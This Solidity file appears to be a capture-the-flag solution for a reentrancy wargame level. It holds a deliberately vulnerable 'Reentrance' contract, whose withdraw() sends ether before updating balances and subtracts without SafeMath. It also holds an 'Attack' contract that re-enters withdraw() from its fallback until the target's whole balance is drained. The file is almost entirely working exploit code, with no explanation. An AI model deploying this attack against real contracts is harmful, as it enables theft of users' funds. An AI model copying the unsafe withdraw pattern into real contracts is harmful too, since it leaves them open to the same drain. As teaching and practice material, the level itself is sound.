// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts@v3.4.2/math/SafeMath.sol";
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
contract Attack{
    Reentrance reEntrace;
    constructor(Reentrance _reEntrace)public {
        reEntrace= _reEntrace;
    }

    function attack()public payable  {
        //msg.value  => 0.001 ether
       reEntrace.donate{value:msg.value}(address(this));
       reEntrace.withdraw(msg.value);
    }

     receive() external payable {
         if(address(reEntrace).balance > 0){
             reEntrace.withdraw(0.001 ether); 
         }
     }
}